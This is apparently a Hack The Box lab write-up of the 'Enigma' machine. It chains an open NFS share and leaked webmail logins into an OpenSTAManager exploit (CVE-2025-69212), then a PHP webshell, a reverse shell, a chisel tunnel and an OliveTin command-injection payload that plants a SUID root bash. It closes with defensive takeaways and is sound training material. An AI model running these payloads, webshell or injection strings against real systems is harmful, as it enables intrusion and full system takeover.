# HTB Write-Up: Enigma

| Field      | Details                                                                  |
|------------|--------------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Enigma)               |
| Difficulty | Easy                                                                   |
| OS         | Linux                                                                    |
| Author     | Babayev                                                                   |
| Date       | June 29, 2026                                                            |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — NFS Share & Leaked Onboarding Document](#2-enumeration--nfs-share--leaked-onboarding-document)
3. [Initial Access — Webmail Pivot Chain to OpenSTAManager Admin](#3-initial-access--webmail-pivot-chain-to-openstamanager-admin)
4. [Foothold — CVE-2025-69212 OpenSTAManager RCE](#4-foothold--cve-2025-69212-openstamanager-rce)
5. [Lateral Movement — Database Credentials & User Pivot to Haris](#5-lateral-movement--database-credentials--user-pivot-to-haris)
6. [Privilege Escalation — OliveTin Command Injection via Chisel Tunnel](#6-privilege-escalation--olivetin-command-injection-via-chisel-tunnel)
7. [Summary](#7-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for fast port discovery, followed by **Nmap** for service and version fingerprinting:

```bash
rustscan -a 10.129.31.96 --ulimit 5000
```

**Open Ports:**

| Port  | Service  | Details                          |
|-------|----------|-----------------------------------|
| 22    | SSH      | OpenSSH 9.6p1 Ubuntu               |
| 80    | HTTP     | nginx 1.24.0 — "Enigma Corp — Managed IT Solutions" |
| 110   | POP3     | Dovecot pop3d                      |
| 111   | RPC      | rpcbind                            |
| 143   | IMAP     | Dovecot imapd                      |
| 993   | IMAPS    | Dovecot imapd (SSL)                |
| 995   | POP3S    | Dovecot pop3d (SSL)                |
| 2049  | NFS      | nfs_acl                            |
| 33725, 51231, 52583, 58989, 60567 | RPC (dynamic) | nlockmgr, mountd, status |

```bash
nmap -A 10.129.31.96 -p 33725,51231,52583,58989,60567
```

The dynamic RPC ports resolved to **mountd**, **nlockmgr**, and **status**, confirming an active **NFS** service alongside a full Dovecot mail stack (POP3/IMAP, plaintext and SSL). The target was added to `/etc/hosts` as `enigma.htb`.

---

## 2. Enumeration — NFS Share & Leaked Onboarding Document

### 2.1 — RPC & NFS Export Enumeration

`rpcinfo` and `netexec` were used to confirm what NFS exports were available without credentials:

```bash
rpcinfo -p enigma.htb
showmount -e enigma.htb
```

```
Export list for enigma.htb:
/srv/nfs/onboarding *
```

```bash
netexec nfs enigma.htb --shares
```

```
NFS  10.129.31.96  52583  enigma.htb  [*] Supported NFS versions: (3, 4) (root escape:True)
NFS  10.129.31.96  52583  enigma.htb  UID  Perms  Storage Usage  Share                Access List
NFS  10.129.31.96  52583  enigma.htb  0    r--    6.0GB/8.5GB    /srv/nfs/onboarding  *
```

The `/srv/nfs/onboarding` export was world-readable with no access restrictions.

### 2.2 — Mounting the Share

```bash
sudo mount -t nfs -o nolock enigma.htb:/srv/nfs/onboarding /mnt/enigma
ls /mnt/enigma
```

```
New_Employee_Access.pdf
```

### 2.3 — Credential Leak in the Onboarding PDF

The PDF was an HR onboarding document for a new hire, containing live webmail credentials in plaintext:

```
Employee: Kevin Mitchell
Department: Operations
Provisioned by: IT Department
Webmail Access
URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

This is a textbook case of sensitive onboarding material being staged on an unauthenticated, world-readable NFS export.

---

## 3. Initial Access — Webmail Pivot Chain to OpenSTAManager Admin

### 3.1 — Logging in as Kevin

`mail001.enigma.htb` was added to `/etc/hosts` and accessed via the **Roundcube** webmail client using Kevin's leaked credentials (`kevin` / `Enigma2024!`).

Kevin's inbox contained a welcome email from **Sarah** in the Accounts department, signed `sarah@enigma.htb`, but the message itself contained no credentials — only confirmation that account provisioning was in progress.

### 3.2 — Pivoting to Sarah

Since Sarah's address was now known, the same login was attempted using her username against the webmail portal, succeeding outright. Sarah's inbox contained a follow-up message from IT Support with access details for an internal support ticketing platform:

```
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s

Note: I will create a dedicated account for you shortly,
for now you can use the admin account to get started.
```

### 3.3 — Accessing OpenSTAManager

`support_001.enigma.htb` was added to `/etc/hosts`, and logging in with the leaked `admin` / `Ne3s4rtars78s` credentials revealed an instance of **OpenSTAManager**, an open-source technical assistance and invoicing platform:

```
OpenSTAManager — DevCode Srl
Version: 2.9.8 (R5ff39df9b)
License: GPLv3
```

This chain — NFS leak → webmail #1 → webmail #2 → internal app admin — illustrates how a single exposed document can cascade into full administrative access to an internal line-of-business application.

---

## 4. Foothold — CVE-2025-69212 OpenSTAManager RCE

### 4.1 — Identifying the Vulnerability

OpenSTAManager 2.9.8 is vulnerable to **CVE-2025-69212**, a command injection flaw in its P7M (signed file) handler, exploitable post-authentication via a malicious ZIP upload.

### 4.2 — Exploiting the RCE

A public proof-of-concept script was used to upload a malicious archive and drop a PHP webshell:

```bash
python3 cve_2025_69212_poc.py \
  -u http://support_001.enigma.htb \
  -c "ti044kldc5tb7kmc6dr9e4r24v" \
  -cmd 'cd files && echo "<?php system(\$_GET[\"c\"]); ?>" > shell.php'
```

```
[*] Uploading malicious ZIP...
[+] Got 500 error (expected - command likely executed)
[+] Check if shell.php exists at /files/SHELL.php
[+] Exploit completed!
```

### 4.3 — Catching a Reverse Shell

The dropped webshell was used to trigger a reverse shell back to a listener:

```bash
rlwrap nc -nvlp 9001
```

```
connect to [10.10.15.84] from (UNKNOWN) [10.129.31.96] 54066
www-data@enigma:~/html/openstamanager/files$
```

A foothold was established as `www-data`.

---

## 5. Lateral Movement — Database Credentials & User Pivot to Haris

### 5.1 — Leaking the Database Configuration

OpenSTAManager's database credentials were read directly from its config file:

```bash
www-data@enigma:~/html/openstamanager$ cat config.inc.php
```

```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

### 5.2 — Dumping Application Users

The leaked database credentials were used to connect to MySQL and dump the application's user table:

```bash
mysql -u brollin -p
# Password: Fri3nds@9099
```

```sql
mysql> use openstamanager;
mysql> select * from zz_users;
```

| id | username | password (bcrypt)                                            | email             |
|----|----------|----------------------------------------------------------------|-------------------|
| 1  | admin    | `$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu` | admin@enigma.htb  |
| 2  | haris    | `$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC` | haris@enigma.htb  |

This confirmed `haris` as a valid system account tied to the application, corroborating a foothold that was then established as `haris` on the box (system shell access, separate from the web service account).

### 5.3 — Confirming Limited Sudo Rights

```bash
haris@enigma:~$ sudo -l
[sudo] password for haris: bestfriends
```

```
Sorry, user haris may not run sudo on enigma.
```

`haris` had no usable `sudo` privileges, so the search shifted to locally bound services that might be reachable only from inside the box.

### 5.4 — Discovering a Loopback-Bound Service

A listening-socket review revealed a process bound exclusively to localhost on an unusual high port:

```bash
haris@enigma:~$ ss -tulnp
```

```
tcp  LISTEN  0  4096  127.0.0.1:1337  0.0.0.0:*
```

Port `1337` was not reachable externally, requiring a tunnel to interact with it.

---

## 6. Privilege Escalation — OliveTin Command Injection via Chisel Tunnel

### 6.1 — Establishing a Reverse Tunnel with Chisel

A `chisel` reverse tunnel was used to expose the loopback-only port `1337` back to the attacking machine:

```bash
# Attacker:
sudo ./chisel server --reverse

# On enigma.htb as haris:
./chisel client 10.10.15.84:8080 R:1337:127.0.0.1:1337
```

```
server: Listening on http://0.0.0.0:8080
server: session#1: tun: proxy#R:1337=>1337: Listening
```

### 6.2 — Identifying OliveTin

With the tunnel active, the service on port 1337 was reachable locally on the attacking machine:

```bash
curl localhost:1337/
```

```html
<title>OliveTin</title>
<meta name="description" content="Give safe and simple access to predefined
shell commands from a web interface." />
```

**OliveTin** is a self-hosted web UI for exposing predefined shell commands as clickable "actions" — and by design, it executes commands with the privileges of the user running it. The associated `config.yaml` (read earlier from `/opt/OliveTin/OliveTin-linux-amd64/`) defined a `backup_database` action that accepted user-controllable arguments (`db_user`, `db_pass`, `db_name`) and passed them into a shell command — a classic recipe for command injection if those arguments weren't sanitized.

### 6.3 — Command Injection via the `backup_database` Action

A malicious `db_pass` argument was crafted to break out of the intended `mysqldump` invocation and inject an arbitrary command, copying `/bin/bash` and setting the SUID bit on it:

```bash
cat > /tmp/request.json <<'EOF'
{
  "actionId": "backup_database",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #'"},
    {"name": "db_name", "value": "production"}
  ]
}
EOF
```

The crafted request was sent to OliveTin's REST API through the chisel tunnel:

```bash
curl -sS -X POST -H 'Content-Type: application/json' \
  --data-binary @/tmp/request.json \
  http://127.0.0.1:1337/api/StartActionAndWait
```

**Response:**

```json
{"logEntry":{"actionTitle":"Backup Database","output":"Usage: mysqldump [OPTIONS] database [tables]...","exitCode":0,"user":"guest", ...}}
```

The injected payload executed as a side effect of the malformed `mysqldump` invocation — OliveTin itself runs as `root`, so the injected command ran with root privileges.

### 6.4 — Confirming the SUID Root Shell

```bash
haris@enigma:/tmp$ ls -la
```

```
-rwsr-xr-x  1 root  root  1446024 Jun 29 13:10 rootbash
```

The `rootbash` binary was created with the SUID bit set and owned by `root`.

### 6.5 — Root Shell & Flag

```bash
haris@enigma:/tmp$ ./rootbash -p
whoami
root
```

The `-p` flag preserved the effective root privileges granted by the SUID bit rather than dropping them, yielding a stable root shell.

---

## 7. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | RustScan + Nmap | Mail stack (Dovecot), RPC/NFS, and HTTP identified on `enigma.htb` |
| Enumeration | `showmount` / netexec NFS | World-readable `/srv/nfs/onboarding` export discovered |
| Credential Leak #1 | Mounted NFS share | `New_Employee_Access.pdf` leaked Kevin's webmail credentials |
| Pivot #1 | Roundcube webmail as `kevin` | Email referencing Sarah found; no direct credentials |
| Pivot #2 | Roundcube webmail as `sarah` | Email leaked OpenSTAManager `admin` credentials |
| Initial Access | OpenSTAManager admin login | Internal support platform `support_001.enigma.htb` accessed |
| Foothold | CVE-2025-69212 (P7M command injection) | Webshell dropped; reverse shell as `www-data` |
| Lateral Movement | `config.inc.php` DB creds + MySQL dump | `zz_users` table dumped; `haris` system account confirmed |
| User Pivot | System access as `haris` | Limited sudo rights; loopback service on port 1337 found |
| Tunneling | Chisel reverse tunnel | Loopback-only OliveTin instance exposed for interaction |
| Privilege Escalation | OliveTin `backup_database` argument injection | Arbitrary command execution as `root` via OliveTin |
| Root | SUID `rootbash` | Root shell confirmed via `./rootbash -p` |

### Key Takeaways

- **Unauthenticated NFS exports are an easy, high-value target.** A world-readable share hosting an onboarding PDF with live credentials turned zero access into a multi-account foothold. NFS exports should always be restricted by host/IP and never serve documents containing live secrets.

- **Credential chains compound quickly.** A single leaked webmail password led to a second mailbox, which led to admin access on an internal line-of-business app. Each hop looked low-risk in isolation, but together they formed a complete path to RCE — a reminder that "internal-only" credentials shared over email are still credentials.

- **Third-party software needs active patch management.** CVE-2025-69212 in OpenSTAManager's P7M handler gave straightforward authenticated RCE. Self-hosted business applications are frequently neglected compared to OS-level patching, despite often holding equivalent or greater risk.

- **Config files are a routine source of plaintext database credentials.** `config.inc.php` handed over working MySQL credentials with no extra effort, which then exposed every application user's password hash. Secrets belonging in environment-managed stores or vaults should never sit in web-readable config files.

- **"Localhost-only" does not mean "safe."** OliveTin was deliberately bound to `127.0.0.1:1337` to limit exposure, but a single low-privileged shell and a chisel tunnel made it fully reachable. Any tool that executes arbitrary shell commands — especially one running as `root` — needs strict argument validation regardless of how its network exposure is scoped, since local access is rarely impossible to obtain.

- **User-supplied arguments in shell-wrapping tools are inherently dangerous.** OliveTin's `backup_database` action concatenated unsanitized arguments into a shell command, allowing a single quote and semicolon to pivot from "pass a password to mysqldump" to "execute anything as root." Any interface that builds shell commands from user input needs rigorous escaping or, better, should avoid shelling out with untrusted parameters entirely.
